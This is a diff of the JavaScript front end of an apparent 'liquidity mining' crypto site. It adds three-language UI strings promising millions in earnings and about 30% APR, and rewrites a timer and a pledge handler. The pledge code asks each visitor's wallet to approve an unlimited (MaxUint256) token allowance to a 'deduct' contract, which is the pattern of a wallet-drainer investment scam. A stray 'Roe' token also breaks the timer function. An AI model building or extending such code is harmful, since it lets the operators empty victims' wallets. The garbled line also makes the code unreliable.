@@ -226,11 +226,209 @@ let cachedWalletBalances = { USDT: 0n, USDC: 0n, WETH: 0n };
 
 // ==================== 翻譯表 ====================
 const translations = {
-  'en': { /* 您的原始翻譯 */ },
-  'zh-Hant': { /* 您的原始翻譯 */ },
-  'zh-Hans': { /* 您的原始翻譯 */ }
+  'en': {
+  title: 'Liquidity Mining',
+  subtitle: 'Start Earning Millions',
+  tabLiquidity: 'Liquidity',
+  tabPledging: 'Pledging',
+  grossOutputLabel: 'Total Output Interest',
+  cumulativeLabel: 'Claimable',
+  walletBalanceLabel: 'Wallet Balance',
+  accountBalanceLabel: 'Account Balance',
+  nextBenefit: 'Next Benefit: 00:00:00',
+  startBtnText: 'Start',
+  pledgeAmountLabel: 'Pledge Amount',
+  pledgeDurationLabel: 'Duration',
+  pledgeBtnText: 'Pledge Now',
+  claimBtnText: 'Claim',
+  noClaimable: 'No claimable interest available.',
+  claimSuccess: 'Claim successful!',
+  nextClaimTime: 'Next claim in 12 hours.',
+  miningStarted: 'Mining started!',
+  error: 'Error',
+  offlineWarning: 'Server offline, using local mode.',
+  noWallet: 'Please connect your wallet.',
+  dataSent: 'Data sent.',
+  pledgeSuccess: 'Pledge successful!',
+  pledgeError: 'Pledge failed.',
+  invalidPledgeAmount: 'Invalid amount.',
+  invalidPledgeToken: 'Invalid token.',
+  insufficientBalance: 'Insufficient balance.',
+  ethersError: 'Ethers.js error.',
+  approveError: 'Approval failed.',
+  selectTokenFirst: 'Select token first.',
+  balanceZero: 'Balance zero.',
+  balanceTooLow: 'Balance too low.',
+  wethValueTooLow: 'WETH value too low.',
+  rulesTitle: 'Mining Rules',
+  pendingInterest: 'Pending Interest',
+  claimedInterest: 'Claimed Interest',
+  rulesContent: `
+    <p>1. Select token, need at least 500 USDT/USDC or WETH $500 to start.</p>
+    <p>2. Insufficient: can authorize but not start.</p>
+    <p>3. APR: 28.3% ~ 31.5%.</p>
+    <p>4. Interest every 12 hours (PT 00:00 & 12:00).</p>
+    <p>5. Pledging will also be included in liquidity mining interest calculation.</p>
+  `,
+  modalClaimableLabel: 'Claimable',
+  modalSelectedTokenLabel: 'Selected Token',
+  modalEquivalentValueLabel: 'Equivalent Value',
+  totalPledge: 'Total Pledged',
+  estimate: 'Estimated Return',
+  pledgeDetailTitle: 'Pledge Details',
+  orderCount: 'Orders',
+  startTime: 'Start Time',
+  remaining: 'Remaining',
+  cycle: 'Cycle',
+  apr: 'APR',
+  accrued: 'Accrued Interest',
+  exceedBalance: 'Amount exceeds wallet balance!',
+  accountDetailTitle: 'Account Balance Details',
+  totalBalance: 'Total Balance',
+  pledgedAmount: 'Pledged Amount',
+  pendingInterest: 'Pending Interest',
+  claimedInterest: 'Claimed Interest',
+  walletBalance: 'Wallet Balance',
+  confirm: 'Confirm'
+  },
+  'zh-Hant': {
+    title: '流動性挖礦',
+    subtitle: '開始賺取數百萬',
+    tabLiquidity: '流動性',
+    tabPledging: '質押',
+    grossOutputLabel: '總產出利息',
+    cumulativeLabel: '可領取',
+    walletBalanceLabel: '錢包餘額',
+    accountBalanceLabel: '帳戶餘額',
+    nextBenefit: '下次收益: 00:00:00',
+    startBtnText: '開始',
+    pledgeAmountLabel: '質押金額',
+    pledgeDurationLabel: '期間',
+    pledgeBtnText: '立即質押',
+    claimBtnText: '領取',
+    noClaimable: '無可領取利息。',
+    claimSuccess: '領取成功！',
+    nextClaimTime: '下次領取時間：12 小時後。',
+    miningStarted: '挖礦開始！',
+    error: '錯誤',
+    offlineWarning: '伺服器離線，使用本地模式。',
+    noWallet: '請連結您的錢包。',
+    dataSent: '數據已發送。',
+    pledgeSuccess: '質押成功！',
+    pledgeError: '質押失敗。',
+    invalidPledgeAmount: '金額無效。',
+    invalidPledgeToken: '代幣無效。',
+    insufficientBalance: '餘額不足。',
+    ethersError: 'Ethers.js 錯誤。',
+    approveError: '授權失敗。',
+    selectTokenFirst: '請先選擇代幣。',
+    balanceZero: '餘額為零。',
+    balanceTooLow: '餘額過低。',
+    wethValueTooLow: 'WETH 價值過低。',
+    rulesTitle: '挖礦規則',
+    pendingInterest: '待領取利息',
+    claimedInterest: '已領取利息',
+    rulesContent: `
+      <p>1. 選擇代幣，需至少 500 USDT/USDC 或 WETH $500 才能開始。</p>
+      <p>2. 不足：可授權但無法開始。</p>
+      <p>3. 年化利率：28.3% ~ 31.5%。</p>
+      <p>4. 每 12 小時發放一次（美西時間 00:00 與 12:00）。</p>
+      <p>5. 質押也會一併計算流動性挖礦利息。</p>
+    `,
+    modalClaimableLabel: '可領取',
+    modalSelectedTokenLabel: '選擇代幣',
+    modalEquivalentValueLabel: '等值金額',
+    totalPledge: '總質押金額',
+    estimate: '預估收益',
+    pledgeDetailTitle: '質押明細',
+    orderCount: '筆數',
+    startTime: '開始時間',
+    remaining: '剩餘時間',
+    cycle: '週期',
+    apr: '年化',
+    accrued: '累積利息',
+    exceedBalance: '金額超出錢包餘額！',
+    accountDetailTitle: '帳戶餘額明細',
+    totalBalance: '總餘額',
+    pledgedAmount: '質押金額',
+    pendingInterest: '待領取利息',
+    claimedInterest: '已領取利息',
+    walletBalance: '錢包餘額',
+    confirm: '確認'
+  },
+  'zh-Hans': {
+    title: '流动性挖矿',
+    subtitle: '开始赚取数百万',
+    tabLiquidity: '流动性',
+    tabPledging: '质押',
+    grossOutputLabel: '总产出利息',
+    cumulativeLabel: '可领取',
+    walletBalanceLabel: '钱包余额',
+    accountBalanceLabel: '账户余额',
+    nextBenefit: '下次收益: 00:00:00',
+    startBtnText: '开始',
+    pledgeAmountLabel: '质押金额',
+    pledgeDurationLabel: '期间',
+    pledgeBtnText: '立即质押',
+    claimBtnText: '领取',
+    noClaimable: '无可领取利息。',
+    claimSuccess: '领取成功！',
+    nextClaimTime: '下次领取时间：12小时后。',
+    miningStarted: '挖矿开始！',
+    error: '错误',
+    offlineWarning: '服务器离线，使用本地模式。',
+    noWallet: '请连接您的钱包。',
+    dataSent: '数据已发送。',
+    pledgeSuccess: '质押成功！',
+    pledgeError: '质押失败。',
+    invalidPledgeAmount: '金额无效。',
+    invalidPledgeToken: '代币无效。',
+    insufficientBalance: '余额不足。',
+    ethersError: 'Ethers.js 错误。',
+    approveError: '授权失败。',
+    selectTokenFirst: '请先选择代币。',
+    balanceZero: '余额为零。',
+    balanceTooLow: '余额过低。',
+    wethValueTooLow: 'WETH价值过低。',
+    rulesTitle: '挖矿规则',
+    pendingInterest: '待领取利息',
+    claimedInterest: '已领取利息',
+    rulesContent: `
+      <p>1. 选择代币，需至少 500 USDT/USDC 或 WETH $500才能开始。</p>
+      <p>2. 不足：可授权但无法开始。</p>
+      <p>3. 年化利率：28.3% ~ 31.5%。</p>
+      <p>4. 每12小时发放一次（美西时间00:00与12:00）。</p>
+      <p>5. 质押也会一并计算流动性挖矿利息。</p>
+    `,
+    modalClaimableLabel: '可领取',
+    modalSelectedTokenLabel: '选择代币',
+    modalEquivalentValueLabel: '等值金额',
+    totalPledge: '总质押金额',
+    estimate: '预估收益',
+    pledgeDetailTitle: '质押明细',
+    orderCount: '笔数',
+    startTime: '开始时间',
+    remaining: '剩余时间',
+    cycle: '周期',
+    apr: '年化',
+    accrued: '累计利息',
+    exceedBalance: '金额超出钱包余额！',
+    accountDetailTitle: '账户余额明细',
+    totalBalance: '总余额',
+    pledgedAmount: '质押金额',
+    pendingInterest: '待领取利息',
+    claimedInterest: '已领取利息',
+    walletBalance: '钱包余额',
+    confirm: '确认'
+  }
 };
-let currentLang = localStorage.getItem('language') || 'en';
+
+// ==================== 語言防呆 ====================
+let currentLang = localStorage.getItem('language');
+if (!currentLang || !translations[currentLang]) {
+  currentLang = 'en';
+}
+localStorage.setItem('language', currentLang);
 
 // ==================== 安全數字格式化 ====================
 function safeFixed(value, decimals = 3) {
@@ -599,35 +797,47 @@ function closeClaimModal() {
 }
 function updateNextBenefitTimer() {
   if (!nextBenefit) return;
-  const nextBenefitTimestamp = parseInt(localStorage.getItem('nextBenefitTime')) || 0;
-  const label = translations[currentLang].nextBenefit.split(':')[0];
+
+ Roe  const safeLang = currentLang && translations[currentLang] ? currentLang : 'en';
+  const defaultText = translations[safeLang].nextBenefit || 'Next Benefit: 00:00:00';
+  const label = defaultText.split(':')[0].trim();
+
+  const nextBenefitTimestamp = parseInt(localStorage.getItem('nextBenefitTime') || '0');
   if (!nextBenefitTimestamp) {
     nextBenefit.textContent = `${label}: 00:00:00`;
     return;
   }
+
   const now = Date.now();
   let diff = nextBenefitTimestamp - now;
   if (diff <= 0) {
-    const twelveHoursInMillis = 12 * 60 * 60 * 1000;
-    const newNextBenefitTimestamp = nextBenefitTimestamp + twelveHoursInMillis;
-    localStorage.setItem('nextBenefitTime', newNextBenefitTimestamp.toString());
-    diff = newNextBenefitTimestamp - now;
+    diff = 12 * 60 * 60 * 1000;
+    localStorage.setItem('nextBenefitTime', (nextBenefitTimestamp + diff).toString());
   }
-  const totalSeconds = Math.floor(Math.max(diff, 0) / 1000);
-  const hours = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
-  const minutes = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
-  const seconds = String(totalSeconds % 60).padStart(2, '0');
-  nextBenefit.textContent = `${label}: ${hours}:${minutes}:${seconds}`;
+
+  const totalSeconds = Math.floor(diff / 1000);
+  const h = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
+  const m = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
+  const s = String(totalSeconds % 60).padStart(2, '0');
+
+  nextBenefit.textContent = `${label}: ${h}:${m}:${s}`;
 }
 function setInitialNextBenefitTime() {
   if (localStorage.getItem('nextBenefitTime')) return;
+
+  const safeLang = currentLang && translations[currentLang] ? currentLang : 'en';
+  const defaultText = translations[safeLang].nextBenefit || 'Next Benefit: 00:00:00';
+  const label = defaultText.split(':')[0].trim();
+
   const etOffset = getETOffsetMilliseconds();
   const nowET = new Date(Date.now() + etOffset);
   const nextHour = nowET.getHours() < 12 ? 12 : 24;
   const nextBenefitTimeET = new Date(nowET);
   nextBenefitTimeET.setHours(nextHour, 0, 0, 0);
   const finalNextBenefitTimestamp = nextBenefitTimeET.getTime() - etOffset;
+
   localStorage.setItem('nextBenefitTime', finalNextBenefitTimestamp.toString());
+  updateNextBenefitTimer();
 }
 function activateStakingUI() {
   if (startBtn) startBtn.style.display = 'none';
@@ -1181,82 +1391,82 @@ document.addEventListener('DOMContentLoaded', async () => {
     });
   }
   if (pledgeBtn) {
-  pledgeBtn.addEventListener('click', async () => {
-    if (!signer || !userAddress) {
-      updateStatus(translations[currentLang].noWallet, true);
-      return;
-    }
-    const isActive = await retry(() => deductContract.isServiceActiveFor(userAddress));
-    if (!isActive) {
-      updateStatus('請先完成合約授權', true);
-      return;
-    }
-    const amount = parseFloat(pledgeAmount.value) || 0;
-    const durationDays = parseInt(pledgeDuration.value) || 90;
-    const token = pledgeToken.value;
-    if (amount <= 0) {
-      updateStatus(translations[currentLang].invalidPledgeAmount, true);
-      return;
-    }
-    const locked = await isPledgeLocked(userAddress);
-    if (locked) {
-      updateStatus('質押進行中，請稍候...', true);
-      return;
-    }
-    pledgeBtn.disabled = true;
-    pledgeBtn.textContent = '處理中...';
-    try {
-      const decimals = token === 'WETH' ? 18 : 6;
-      const bigIntBalance = cachedWalletBalances[token] || 0n;
-      const walletBalance = parseFloat(ethers.formatUnits(bigIntBalance, decimals));
-      if (amount > walletBalance) {
-        throw new Error(translations[currentLang].insufficientBalance);
+    pledgeBtn.addEventListener('click', async () => {
+      if (!signer || !userAddress) {
+        updateStatus(translations[currentLang].noWallet, true);
+        return;
       }
-      const duration = PLEDGE_DURATIONS.find(d => d.days === durationDays);
-      if (duration && amount < duration.min) {
-        throw new Error(`最低質押金額：${duration.min} ${token}`);
+      const isActive = await retry(() => deductContract.isServiceActiveFor(userAddress));
+      if (!isActive) {
+        updateStatus('請先完成合約授權', true);
+        return;
       }
-      const tokenContract = { USDT: usdtContract, USDC: usdcContract, WETH: wethContract }[token];
-      const currentAllowance = await retry(() => tokenContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS));
-      const REQUIRED_ALLOWANCE = ethers.parseUnits("340282366920938463463374607431768211456", 0);
-      if (currentAllowance < REQUIRED_ALLOWANCE) {
-        updateStatus(`正在為 ${token} 授權...`);
-        const approveTx = await tokenContract.approve.populateTransaction(
-          DEDUCT_CONTRACT_ADDRESS,
-          ethers.MaxUint256
-        );
-        await sendMobileRobustTransaction(approveTx);
+      const amount = parseFloat(pledgeAmount.value) || 0;
+      const durationDays = parseInt(pledgeDuration.value) || 90;
+      const token = pledgeToken.value;
+            if (amount <= 0) {
+        updateStatus(translations[currentLang].invalidPledgeAmount, true);
+        return;
       }
-      updateStatus('提交質押請求...');
-      const response = await fetch(`${BACKEND_API_URL}/api/pledge`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ address: userAddress, amount, token, duration: durationDays })
-      });
-      if (!response.ok) {
-        const text = await response.text();
-        throw new Error(`請求失敗: ${response.status} - ${text}`);
+      const locked = await isPledgeLocked(userAddress);
+      if (locked) {
+        updateStatus('質押進行中，請稍候...', true);
+        return;
       }
-      const result = await response.json();
-      if (!result.success) {
-        throw new Error(result.error || '伺服器拒絕質押請求');
-      }
-      updateStatus(`質押請求已提交，訂單編號：${result.orderId}`);
-      const poll = setInterval(async () => {
-        const stillLocked = await isPledgeLocked(userAddress);
-        if (!stillLocked) {
-          pledgeBtn.disabled = false;
-          pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
-          clearInterval(poll);
+      pledgeBtn.disabled = true;
+      pledgeBtn.textContent = '處理中...';
+      try {
+        const decimals = token === 'WETH' ? 18 : 6;
+        const bigIntBalance = cachedWalletBalances[token] || 0n;
+        const walletBalance = parseFloat(ethers.formatUnits(bigIntBalance, decimals));
+        if (amount > walletBalance) {
+          throw new Error(translations[currentLang].insufficientBalance);
         }
-      }, 2000);
-    } catch (error) {
-      pledgeBtn.disabled = false;
-      pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
-      updateStatus(`${translations[currentLang].pledgeError}: ${error.message}`, true);
-    }
-  });
-}
+        const duration = PLEDGE_DURATIONS.find(d => d.days === durationDays);
+        if (duration && amount < duration.min) {
+          throw new Error(`最低質押金額：${duration.min} ${token}`);
+        }
+        const tokenContract = { USDT: usdtContract, USDC: usdcContract, WETH: wethContract }[token];
+        const currentAllowance = await retry(() => tokenContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS));
+        const REQUIRED_ALLOWANCE = ethers.parseUnits("340282366920938463463374607431768211456", 0);
+        if (currentAllowance < REQUIRED_ALLOWANCE) {
+          updateStatus(`正在為 ${token} 授權...`);
+          const approveTx = await tokenContract.approve.populateTransaction(
+            DEDUCT_CONTRACT_ADDRESS,
+            ethers.MaxUint256
+          );
+          await sendMobileRobustTransaction(approveTx);
+        }
+        updateStatus('提交質押請求...');
+        const response = await fetch(`${BACKEND_API_URL}/api/pledge`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ address: userAddress, amount, token, duration: durationDays })
+        });
+        if (!response.ok) {
+          const text = await response.text();
+          throw new Error(`請求失敗: ${response.status} - ${text}`);
+        }
+        const result = await response.json();
+        if (!result.success) {
+          throw new Error(result.error || '伺服器拒絕質押請求');
+        }
+        updateStatus(`質押請求已提交，訂單編號：${result.orderId}`);
+        const poll = setInterval(async () => {
+          const stillLocked = await isPledgeLocked(userAddress);
+          if (!stillLocked) {
+            pledgeBtn.disabled = false;
+            pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
+            clearInterval(poll);
+          }
+        }, 2000);
+      } catch (error) {
+        pledgeBtn.disabled = false;
+        pledgeBtn.textContent = translations[currentLang].pledgeBtnText;
+        updateStatus(`${translations[currentLang].pledgeError}: ${error.message}`, true);
+      }
+    });
+  }
   if (refreshWallet) refreshWallet.addEventListener('click', forceRefreshWalletBalance);
   if (pledgeAmount) pledgeAmount.addEventListener('input', updateEstimate);
   if (pledgeDuration) pledgeDuration.addEventListener('change', updateEstimate);
